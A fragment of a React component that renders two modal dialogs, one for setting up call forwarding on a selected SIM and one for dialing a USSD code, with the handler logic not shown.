              {sendLoading ? "Sending…" : "Proceed"}
            </button>
          </div>
        </div>
      )}

      {/* ── Call Forward Modal ── */}
      {cfOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Call Forwarding</span>
              <button type="button" onClick={() => setCfOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-2 text-[13px] font-semibold text-gray-600">SIM:</div>
            {/* Radio-style SIM selector like competitor image 4 */}
            <div className="mb-4 overflow-hidden rounded-xl border border-gray-200">
              {simOptions.map((o, idx) => (
                <button key={o.value} type="button" onClick={() => setCfSim(o.value)}
                  className={[
                    "flex w-full items-center justify-between px-5 py-4 text-[15px] font-semibold",
                    idx < simOptions.length - 1 ? "border-b border-gray-100" : "",
                    cfSim === o.value ? "text-gray-900" : "text-gray-400",
                  ].join(" ")}>
                  <span>{o.label}</span>
                  <div className={[
                    "h-5 w-5 rounded-full border-2 transition",
                    cfSim === o.value ? "border-yellow-600 bg-yellow-600" : "border-gray-300 bg-white",
                  ].join(" ")} />
                </button>
              ))}
            </div>
            <input value={cfNumber} onChange={e => setCfNumber(e.target.value)}
              placeholder="Forwarding number" inputMode="tel"
              className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <div className="space-y-2">
              <button type="button" onClick={() => handleCallForward("activate")} disabled={cfLoading}
                className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50">
                Proceed
              </button>
              <div className="grid grid-cols-2 gap-2">
                <button type="button" onClick={() => handleCallForward("deactivate")} disabled={cfLoading}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 leading-tight">
                  DeActive Call Forwarding
                </button>
                <button type="button" onClick={() => handleCallForward("check")} disabled={cfLoading}
                  className="rounded-xl border border-gray-300 bg-white py-3 text-[13px] font-semibold text-gray-800 hover:bg-gray-50">
                  Check Forwarding
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Dial USSD Modal ── */}
      {ussdOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-5 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">USSD Dialing</span>
              <button type="button" onClick={() => setUssdOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">SIM:</div>
            <select value={ussdSim} onChange={e => setUssdSim(Number(e.target.value))}
              className="mb-4 h-12 w-full rounded-xl border-2 border-green-500 bg-white px-3 text-[14px] outline-none">
              {simOptions.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
            </select>
            <div className="mb-1 text-[13px] font-semibold text-gray-600">USSD Code:</div>
            <input value={ussdCode} onChange={e => setUssdCode(e.target.value)}
              placeholder="e.g. *123#" autoFocus
              className="mb-5 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleDialUssd}
              disabled={ussdLoading || !ussdCode.trim()}
              className="w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              {ussdLoading ? "Sending…" : "Proceed"}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
